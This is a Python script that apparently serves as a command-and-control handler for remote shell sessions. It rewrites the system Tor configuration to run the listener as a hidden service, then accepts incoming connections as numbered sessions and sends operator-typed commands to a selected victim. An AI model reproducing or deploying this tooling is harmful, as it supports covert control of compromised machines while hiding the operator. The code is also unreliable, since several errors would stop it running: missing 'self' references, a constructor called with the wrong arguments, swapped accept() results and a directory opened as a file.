import socket
import time
import _thread
import os
import subprocess

def GetTorPid():
    open("tmp.txt", 'w').close()
    os.system("ps -A | grep -w tor >> tmp.txt")
    for lines in open('tmp.txt','r'):
        return lines[1:5]
        
    
def CreateHiddenService(port,payload):
    f = open("Sources/torrc",'r')
    os.system("cp /etc/tor/torrc /etc/tor/torrc.copy")
    os.system("rm /etc/tor/torrc")
    torrc = open("/etc/tor/torrc",'w')
    counter = 1
    for lines in f:
        if counter == 72:
            torrc.write("HiddenServiceDir ~/hidden_service/" + payload + "/")
        if counter == 73:
            torrc.write("HiddenServicePort "+port+" 127.0.0.1:"+port)
        else:
            torrc.write(lines)
    torrc.close()
    f.close()
    os.system("tor")

def GetHostName(payload):
    f = open("~/hidden_service/" + payload + "/")
    for line in f:
        return line


def run(payload,port):
    pid = GetTorPid()
    os.system("kill " + pid)
    CreateHiddenService(port,payload)
    rhost = GetHostName(payload)
    s = Server(port)
    s.start()


class Server:

    def __init__(self,port,payload):
        self.sock = socket.socket()
        self.payload = payload
        self.addr = GetHostName(payload)
        self.port = port
        self.clients = {}

    def run(self):
        self.sock.bind((self.addr,self.port))
        self.sock.listen(5)
        counter = 1
        _thread.start_new_thread(handler,())        
        while 1:            
            addr,conn = sock.accept()
            c = client(addr,conn)
            self.clients[counter] = c   
            print("recived new session at channel: " + counter)
            counter += 1
            time.sleep(0.5)

    def handler(self):
        self.currentChannel = 0
        while 1:             
                inp = input(self.payload + ">")
                if inp.startswith("set"):
                    self.currentChannel = int(inp.split(" ")[1])
                    comunicate()
                if inp == "exit":
                    break
    
    def comunicate(self):
        while 1:    
            data = self.clients[self.currentChannel].conn.recv(1024)
            print(repr(data))
            cmd = input(self.payload + "/sessions>")
            if cmd.startswith("change"):
                self.currentChannel = int(cmd.split(" ")[1])
                continue
            if cmd == "exit":
                break
            self.clients[self.currentChannel].conn.send(cmd.encode())

class client:

    def __init__(self,addr,conn):
        self.addr = addr
        self.conn = conn


            
    